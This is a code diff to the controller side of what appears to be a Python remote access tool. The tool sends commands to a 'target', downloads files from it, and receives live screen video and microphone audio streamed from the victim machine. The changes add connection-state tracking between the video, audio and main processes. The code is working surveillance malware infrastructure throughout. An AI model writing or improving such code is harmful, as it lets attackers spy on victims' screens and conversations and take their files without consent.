@@ -79,6 +79,7 @@ def download_file(socket, file_name):
         # Reset the timeout to its default value (None).
         socket.settimeout(None)
 
+
 # Function for the main communication loop with the target
 def target_communication(target):
     dir = ''
@@ -106,9 +107,13 @@ def target_communication(target):
 
         # Screen Streaming
         elif command == 'screen':
-            start_screen_stream()
-            screen_process.join()
-           
+            connected = {'video': False, 'audio': False}
+            start_screen_stream(connected)
+            # while not (connected['video'] and connected['audio']):
+            #     print('waiting...')
+            #     import time
+            #     time.sleep(2)
+            
         # Others
         else:
             result = reliable_recv(target)
@@ -132,12 +137,13 @@ def receive_all(sock, count):
     return buf
 
 # Video receiving and displaying
-def video_stream(server_socket, frame_queue):
+def video_stream(server_socket, frame_queue, connected):
     client_socket, addr = server_socket.accept()
     print('Video connection from:', addr)
+    connected['video'] = True
 
     try:
-        while True:
+        while connected['video']:
             message_size = receive_all(client_socket, struct.calcsize(">L"))
             if not message_size:
                 break
@@ -151,11 +157,13 @@ def video_stream(server_socket, frame_queue):
             frame_queue.put(frame)
     finally:
         client_socket.close()
+        connected['video'] = False
 
 # Audio receiving and playing
-def audio_stream(server_socket):
+def audio_stream(server_socket, connected):
     client_socket, addr = server_socket.accept()
     print('Audio connection from:', addr)
+    connected['audio'] = True
 
     p = pyaudio.PyAudio()
     stream = p.open(format=FORMAT,
@@ -165,7 +173,7 @@ def audio_stream(server_socket):
                     frames_per_buffer=CHUNK)
 
     try:
-        while True:
+        while connected['audio']:
             message_size = receive_all(client_socket, struct.calcsize(">L"))
             if not message_size:
                 break
@@ -179,9 +187,10 @@ def audio_stream(server_socket):
         stream.stop_stream()
         stream.close()
         p.terminate()
+        connected['audio'] = False
 
 # Screen streamer
-def screen_streamer():
+def screen_streamer(connected, commu_queue):
 
     # Video streaming
     video_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -197,16 +206,22 @@ def screen_streamer():
     
     frame_queue = queue.Queue()
 
-    video_thread = threading.Thread(target=video_stream, args=(video_server_socket, frame_queue))
-    audio_thread = threading.Thread(target=audio_stream, args=(audio_server_socket,))
+    video_thread = threading.Thread(target=video_stream, args=(video_server_socket, frame_queue, connected))
+    audio_thread = threading.Thread(target=audio_stream, args=(audio_server_socket, connected))
     
     video_thread.start()
     audio_thread.start()
 
+    # Wait until both video and audio connections are established
+    while not (connected['video'] and connected['audio']):
+        pass
+    
+    commu_queue.put("Connection Established")
+
     # Display frames from the queue in the main thread
     cv2.namedWindow('Received', cv2.WINDOW_GUI_NORMAL)
     try:
-        while True:
+        while connected['video'] and connected['audio']:
             if not frame_queue.empty():
                 frame = frame_queue.get()
                 cv2.imshow('Received', frame)
@@ -214,20 +229,31 @@ def screen_streamer():
                     break
     finally:
         cv2.destroyAllWindows()
+        connected['video'] = False
+        connected['audio'] = False
 
     video_thread.join()
     audio_thread.join()
 
+
 # Function to start screen streaming in a separate process
-def start_screen_stream():
+def start_screen_stream(connected):
     global screen_process
-    
+
+    # Create a queue for communication
+    commu_queue = multiprocessing.Queue()
+
     # Create a new process for screen streaming
-    screen_process = multiprocessing.Process(target=screen_streamer)
+    screen_process = multiprocessing.Process(target=screen_streamer, args=(connected, commu_queue, ))
     screen_process.start()
     
     # Print process ID for reference
     print(f"Screen streaming process started with PID: {screen_process.pid}")
+
+    # Main process continues here
+    # Wait for a signal from the child process
+    message = commu_queue.get()
+    print(f"Received message from screen process: {message}")
 
 # Function to stop screen streaming process
 def stop_screen_stream():
